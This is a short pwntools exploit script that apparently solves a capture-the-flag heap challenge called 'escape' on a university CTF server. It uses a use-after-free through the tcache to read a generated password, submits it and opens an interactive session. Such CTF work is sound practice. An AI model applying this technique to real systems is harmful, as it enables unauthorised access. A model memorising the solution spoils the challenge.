from pwn import *

exe = context.binary = ELF('./escape', checksec=False)
host = "uithack.td.org.uit.no"
port = 9004

#io = process(exe.path)
io = remote(host, port)

def create(size, data):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b">> ", str(size).encode())
    io.sendlineafter(b">> ", data)

def delete():
    io.sendlineafter(b">> ", b"2")

def view():
    io.sendlineafter(b">> ", b"3")
    io.recvline()
    return io.recvline().rstrip()

def generate_password():
    io.sendlineafter(b">> ", b"4")

def guess_password():
    io.sendlineafter(b">> ", b"5")

# Add our guess chunk to the tcache
create(0x20, b"A")
delete()

# Password will reuse our freed guess chunk
generate_password()

# Our guess chunk now points to the password chunk, so we can view the password
password = view()
log.success(f"Password: {password}")

# Create guess with the password we viewed
create(0x20, password)
guess_password()

io.interactive()

